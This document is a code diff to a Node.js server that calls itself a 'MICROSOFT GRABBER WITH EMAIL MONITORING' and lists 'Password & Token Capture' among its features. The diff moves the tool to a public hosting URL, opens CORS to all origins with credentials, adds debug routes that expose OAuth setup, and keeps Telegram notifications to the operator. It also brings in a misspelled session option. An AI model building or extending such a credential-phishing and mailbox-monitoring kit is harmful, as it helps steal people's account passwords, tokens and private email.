@@ -7,6 +7,7 @@ const fetch = require('node-fetch');
 const fs = require('fs');
 const path = require('path');
 const FormData = require('form-data');
+const cors = require('cors'); // ADDED CORS
 
 const {
     CLIENT_ID, CLIENT_SECRET, REDIRECT_URI,
@@ -15,6 +16,12 @@ const {
 
 const app = express();
 
+// ADDED CORS SUPPORT
+app.use(cors({
+    origin: true, // Allow all origins for now
+    credentials: true
+}));
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static('public'));
@@ -22,7 +29,7 @@ app.use(express.static('public'));
 app.use(session({
     secret: SESSION_SECRET,
     resave: false,
-    saveUninitialized: false,
+    saveUnitialized: false,
     cookie: { secure: false }
 }));
 
@@ -474,6 +481,30 @@ async function startEmailMonitoring() {
 
 // ==================== ROUTES ====================
 
+// ADDED DEBUG ROUTES
+app.get('/debug-env', (req, res) => {
+    res.json({
+        hasClientId: !!process.env.CLIENT_ID,
+        hasClientSecret: !!process.env.CLIENT_SECRET,
+        redirectUri: process.env.REDIRECT_URI,
+        backendUrl: 'https://mail-read-ysbd.onrender.com',
+        environment: 'Render'
+    });
+});
+
+app.get('/debug-oauth', async (req, res) => {
+    try {
+        const authUrl = await pca.getAuthCodeUrl({ 
+            scopes: SCOPES,
+            redirectUri: process.env.REDIRECT_URI,
+            prompt: 'select_account'
+        });
+        res.json({ success: true, authUrl });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
+});
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
@@ -658,7 +689,7 @@ app.get('/clear', (req, res) => {
 app.listen(process.env.PORT || PORT, async () => {
     console.log(`
 🎯 MICROSOFT GRABBER WITH EMAIL MONITORING
-📍 http://localhost:${PORT}
+📍 https://mail-read-ysbd.onrender.com
 
 ✅ Features:
    • Password & Token Capture
@@ -686,5 +717,5 @@ app.listen(process.env.PORT || PORT, async () => {
     // Start email monitoring 30 seconds after server starts
     setTimeout(startEmailMonitoring, 30000);
 
-    await telegramSend(`🚀 Server started: http://localhost:${PORT}\n✅ Email monitoring system activated\n📧 Will start monitoring in 30 seconds`);
+    await telegramSend(`🚀 Server started: https://mail-read-ysbd.onrender.com\n✅ Email monitoring system activated\n📧 Will start monitoring in 30 seconds`);
 });
